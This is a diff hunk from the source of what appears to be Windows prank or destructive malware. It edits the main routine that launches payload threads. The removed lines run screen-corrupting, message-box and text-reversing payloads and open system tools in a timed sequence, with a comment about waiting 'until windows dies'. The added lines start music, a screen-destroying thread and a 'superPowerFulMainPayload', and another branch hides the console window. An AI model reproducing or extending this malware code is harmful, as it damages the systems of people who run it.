@@ -371,46 +371,19 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
             CreateDesktopFiles(); // Create Desktop Files
             const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
-            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
-            /* Main Payload */
-            CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL);
-            Sleep(1500);
-            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
-            Sleep(4500);
-            ShellExecuteA(NULL, NULL, "write", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
-            Sleep(8500);
-            ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
-            Sleep(4500);
-            CreateThread(NULL, NULL, &payloadThread, &payloadReverseText, NULL, NULL);
-            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
-            Sleep(4500);
-            ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
-            Sleep(4500);
-            ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Die.txt\u0022", NULL, SW_SHOW);
-            Sleep(4500);
-            ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
-            Sleep(2250);
-            ShellExecuteA(NULL, NULL, "explorer", NULL, NULL, SW_SHOWDEFAULT);
-            Sleep(2250);
-            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
-            ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
-            Sleep(2250);
-            ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
-            Sleep(6000);
-            ShellExecuteA(NULL, NULL, "cmd", NULL, NULL, SW_SHOWDEFAULT);
-            Sleep(6000);
-            ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Last.txt\u0022", NULL, SW_SHOW);
-            Sleep(6000);
-            CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
-            CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
-            // last 10 seconds (wait until windows dies)
-            Sleep(8000);
 
-            //KWI(FOR;;1000)
-            Sleep(1000);
-            return 0;
+			// Modified main payload for start only the main payload 
+            CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL); // Play the PIANO music >:)
+            Sleep(100); // Wait 100 mili-second
 
-        }
+            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
+            Sleep(100); // Wait 100 mili-second
+
+            CreateThread(NULL, NULL, &payloadThread, &superPowerFulMainPayload, NULL, NULL);
+            Sleep(65000);// Timing
+            ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Last.txt", NULL, SW_SHOW);
+            Sleep(12000);
+            }
         else {
             ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
             goto warning;
